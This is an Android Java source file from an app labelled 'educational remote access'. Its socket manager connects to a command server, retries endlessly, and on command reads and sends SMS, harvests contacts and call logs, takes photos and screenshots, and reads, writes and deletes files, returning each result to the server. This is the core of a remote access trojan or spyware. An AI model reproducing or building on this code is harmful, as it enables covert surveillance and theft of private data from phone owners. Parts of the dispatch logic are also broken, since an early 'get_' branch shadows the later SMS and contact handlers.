package com.remoteaccess.educational.network;

import android.content.Context;
import android.util.Log;
import com.remoteaccess.educational.commands.*;
import com.remoteaccess.educational.utils.DeviceInfo;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;
import org.json.JSONException;
import org.json.JSONObject;
import java.net.URISyntaxException;

/**
 * Advanced Socket Manager with full command support
 */
public class SocketManager {

    private static final String TAG = "SocketManager";
    private Socket socket;
    private Context context;
    private String serverUrl;
    
    // Command Handlers
    private CommandExecutor commandExecutor;
    private SMSHandler smsHandler;
    private ContactsHandler contactsHandler;
    private CallLogsHandler callLogsHandler;
    private CameraHandler cameraHandler;
    private ScreenshotHandler screenshotHandler;
    private FileHandler fileHandler;

    public SocketManager(Context context, String serverUrl) {
        this.context = context;
        this.serverUrl = serverUrl;
        
        // Initialize handlers
        commandExecutor = new CommandExecutor(context);
        smsHandler = new SMSHandler(context);
        contactsHandler = new ContactsHandler(context);
        callLogsHandler = new CallLogsHandler(context);
        cameraHandler = new CameraHandler(context);
        screenshotHandler = new ScreenshotHandler(context);
        fileHandler = new FileHandler(context);
    }

    public void connect() {
        try {
            IO.Options options = new IO.Options();
            options.forceNew = true;
            options.reconnection = true;
            options.reconnectionDelay = 1000;
            options.reconnectionAttempts = Integer.MAX_VALUE;

            socket = IO.socket(serverUrl, options);

            socket.on(Socket.EVENT_CONNECT, onConnect);
            socket.on(Socket.EVENT_DISCONNECT, onDisconnect);
            socket.on(Socket.EVENT_CONNECT_ERROR, onConnectError);
            socket.on("command:execute", onCommandReceived);

            socket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket connection error: " + e.getMessage());
        }
    }

    public void registerDevice(String deviceId) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            data.put("deviceName", DeviceInfo.getDeviceName());
            data.put("model", DeviceInfo.getModel());
            data.put("androidVersion", DeviceInfo.getAndroidVersion());

            socket.emit("device:register", data);
            Log.d(TAG, "Device registered: " + deviceId);

        } catch (JSONException e) {
            Log.e(TAG, "Error registering device: " + e.getMessage());
        }
    }

    public void sendHeartbeat(String deviceId) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            socket.emit("device:heartbeat", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
        }
    }

    public void sendResponse(String deviceId, String command, Object result) {
        try {
            JSONObject data = new JSONObject();
            data.put("deviceId", deviceId);
            data.put("command", command);
            data.put("result", result);
            data.put("timestamp", System.currentTimeMillis());

            socket.emit("device:response", data);
        } catch (JSONException e) {
            Log.e(TAG, "Error sending response: " + e.getMessage());
        }
    }

    public void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket.off();
        }
    }

    // Event Listeners
    private Emitter.Listener onConnect = args -> {
        Log.d(TAG, "Socket connected");
        registerDevice(DeviceInfo.getDeviceId(context));
    };

    private Emitter.Listener onDisconnect = args -> {
        Log.d(TAG, "Socket disconnected");
    };

    private Emitter.Listener onConnectError = args -> {
        Log.e(TAG, "Socket connection error: " + args[0]);
    };

    private Emitter.Listener onCommandReceived = args -> {
        try {
            JSONObject data = (JSONObject) args[0];
            String command = data.getString("command");
            JSONObject params = data.optJSONObject("params");

            Log.d(TAG, "Command received: " + command);

            // Handle command
            handleCommand(command, params);

        } catch (JSONException e) {
            Log.e(TAG, "Error parsing command: " + e.getMessage());
        }
    };

    /**
     * Advanced Command Handler
     */
    private void handleCommand(String command, JSONObject params) {
        String deviceId = DeviceInfo.getDeviceId(context);
        JSONObject result;
        
        try {
            // Basic Commands
            if (command.startsWith("get_") || command.equals("ping") || command.equals("vibrate") 
                || command.equals("play_sound") || command.equals("set_clipboard")) {
                result = commandExecutor.executeCommand(command, params);
            }
            
            // SMS Commands
            else if (command.equals("get_all_sms")) {
                int limit = params != null ? params.optInt("limit", 100) : 100;
                result = smsHandler.getAllSMS(limit);
            }
            else if (command.equals("get_sms_from_number")) {
                String phoneNumber = params.getString("phoneNumber");
                int limit = params.optInt("limit", 50);
                result = smsHandler.getSMSFromNumber(phoneNumber, limit);
            }
            else if (command.equals("send_sms")) {
                String phoneNumber = params.getString("phoneNumber");
                String message = params.getString("message");
                result = smsHandler.sendSMS(phoneNumber, message);
            }
            else if (command.equals("delete_sms")) {
                String smsId = params.getString("smsId");
                result = smsHandler.deleteSMS(smsId);
            }
            
            // Contacts Commands
            else if (command.equals("get_all_contacts")) {
                result = contactsHandler.getAllContacts();
            }
            else if (command.equals("search_contacts")) {
                String query = params.getString("query");
                result = contactsHandler.searchContacts(query);
            }
            
            // Call Logs Commands
            else if (command.equals("get_all_call_logs")) {
                int limit = params != null ? params.optInt("limit", 100) : 100;
                result = callLogsHandler.getAllCallLogs(limit);
            }
            else if (command.equals("get_call_logs_by_type")) {
                int callType = params.getInt("callType");
                int limit = params.optInt("limit", 50);
                result = callLogsHandler.getCallLogsByType(callType, limit);
            }
            else if (command.equals("get_call_logs_from_number")) {
                String phoneNumber = params.getString("phoneNumber");
                int limit = params.optInt("limit", 50);
                result = callLogsHandler.getCallLogsFromNumber(phoneNumber, limit);
            }
            else if (command.equals("get_call_statistics")) {
                result = callLogsHandler.getCallStatistics();
            }
            
            // Camera Commands
            else if (command.equals("get_available_cameras")) {
                result = cameraHandler.getAvailableCameras();
            }
            else if (command.equals("take_photo")) {
                String cameraId = params.optString("cameraId", "0");
                String quality = params.optString("quality", "high");
                result = cameraHandler.takePhoto(cameraId, quality);
            }
            
            // Screenshot Commands
            else if (command.equals("take_screenshot")) {
                result = screenshotHandler.takeScreenshot();
            }
            
            // File Commands
            else if (command.equals("list_files")) {
                String path = params != null ? params.optString("path", null) : null;
                result = fileHandler.listFiles(path);
            }
            else if (command.equals("read_file")) {
                String filePath = params.getString("filePath");
                boolean asBase64 = params.optBoolean("asBase64", false);
                result = fileHandler.readFile(filePath, asBase64);
            }
            else if (command.equals("write_file")) {
                String filePath = params.getString("filePath");
                String content = params.getString("content");
                boolean isBase64 = params.optBoolean("isBase64", false);
                result = fileHandler.writeFile(filePath, content, isBase64);
            }
            else if (command.equals("delete_file")) {
                String filePath = params.getString("filePath");
                result = fileHandler.deleteFile(filePath);
            }
            else if (command.equals("copy_file")) {
                String sourcePath = params.getString("sourcePath");
                String destPath = params.getString("destPath");
                result = fileHandler.copyFile(sourcePath, destPath);
            }
            else if (command.equals("move_file")) {
                String sourcePath = params.getString("sourcePath");
                String destPath = params.getString("destPath");
                result = fileHandler.moveFile(sourcePath, destPath);
            }
            else if (command.equals("create_directory")) {
                String path = params.getString("path");
                result = fileHandler.createDirectory(path);
            }
            else if (command.equals("get_file_info")) {
                String filePath = params.getString("filePath");
                result = fileHandler.getFileInfo(filePath);
            }
            else if (command.equals("search_files")) {
                String directory = params.getString("directory");
                String query = params.getString("query");
                result = fileHandler.searchFiles(directory, query);
            }
            
            // Unknown command
            else {
                result = new JSONObject();
                result.put("success", false);
                result.put("error", "Unknown command: " + command);
            }
            
            // Send response
            sendResponse(deviceId, command, result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error handling command: " + e.getMessage());
            try {
                JSONObject errorResult = new JSONObject();
                errorResult.put("success", false);
                errorResult.put("error", e.getMessage());
                sendResponse(deviceId, command, errorResult);
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
    }
}
